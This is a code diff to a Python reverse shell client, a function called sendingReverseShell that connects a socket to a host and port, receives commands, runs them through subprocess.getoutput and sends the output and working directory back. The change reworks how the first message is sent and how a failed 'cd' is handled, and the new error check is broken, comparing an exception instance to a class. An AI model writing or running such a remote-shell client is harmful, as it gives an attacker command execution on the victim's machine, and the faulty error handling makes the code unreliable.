@@ -36,13 +36,17 @@ def sendingReverseShell():
     s.connect((host, port))
     SEP = "<sep>"
     output = ""
-    cwd = os.getcwd()
-    message = f"{cwd}"
-    s.send(bytes(message, "UTF-8"))
+    first = True
+
     while not quitting:
-        # Sendind first message
         cwd = os.getcwd()
-        message = f"{output}{SEP}{cwd}"
+        
+        if first:
+            first = False
+            message = f"{cwd}"
+        else:
+            message = f"{output}{SEP}{cwd}"
+
         s.send(bytes(message, "UTF-8"))
 
         # Waiting for a command
@@ -56,10 +60,11 @@ def sendingReverseShell():
         if commandArgs[0].lower() == "cd":
             try:
                 os.chdir(' '.join(commandArgs[1:]))
-            except FileNotFoundError as e:
-                output = str(e)
-            else:
-                output = ""
+            except Exception as e:
+                if e == FileNotFoundError: 
+                    output = str(e)
+                else:
+                    output = ""
         else:
             output = subprocess.getoutput(command)
         
